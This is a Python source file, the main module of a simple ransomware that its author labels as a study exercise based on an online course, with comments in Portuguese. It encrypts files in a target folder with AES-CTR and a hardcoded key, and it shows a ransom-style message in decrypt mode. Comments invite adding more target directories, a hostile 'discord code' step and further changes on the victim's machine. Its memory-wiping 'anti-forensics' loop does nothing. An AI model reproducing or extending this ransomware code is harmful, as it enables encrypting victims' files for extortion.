#!/usr/bin/python3.6
# -*- coding: utf-8 -*-

#Um ransonware simples codado em pyhton a título de estudos
#O material de base foi um curso gratuíto na Udemy
#
#Autor: Marco Antonio Damaceno
#Data: 21/01/2021
#
#Módulo Principal

from Crypto.Cipher import AES
from Crypto.Util import Counter
import argparse
import os
import Discovery
import Crypter

#--------------
# a senha pode ter os segintes tamanhos
# 128/192/256 bits 
#--------------

#Como este é um ransoware para fins educativos, abaixo está a chave para desencriptar os arquivos afetados
HARDCODED_KEY = '10203020030soskc,mzjdfnmcnzncxmn'

def get_parser():
    parser = argparse.ArgumentParser(description="hackawareCrypter")
    parser.add_argument('-d', '--decrypt', help='desencripta os arquivos [default: no]', action='store_true')
    return parser

def main():
    parser = get_parser()
    args = vars(parser.parse_args())
    decrypt = args['decrypt']

    if decrypt:
        print('''
            MADS RANSON - Oh My God!
            ---------------------------------------------------
            Seus arquivos foram criptografados! Sorry Darling!

            Para descriptografá-los, utilize a seguinte senha '{}'

            '''.format(HARDCODED_KEY))

        key = input('Digite a Senha jovem! :>')
    else:
        if HARDCODED_KEY:
            key = HARDCODED_KEY

    ctr = Counter.new(128)
    crypt = AES.new(key, AES.MODE_CTR, counter=ctr)

    if not decrypt:
        cryptFn = crypt.encrypt
    else:
        cryptFn = crypt.decrypt

    init_path = os.path.abspath(os.path.join(os.getcwd(), 'files'))
    startDirs = [init_path] #Você pode adicionar outras pastas seguidas de virgula

    for currentDir in startDirs:
        for filename in Discovery.discovery(currentDir):
            Crypter.change_files(filename, cryptFn)
    
    #limpa a chave de criptografia da mémória para evitar forense
    for _ in range(100):
        pass

    if not decrypt:
        #código da discórdia aqui.

        pass

    #Aqui você pode alterar qualquer coisa na máquina alvo...

if __name__ == '__main__':
    main()
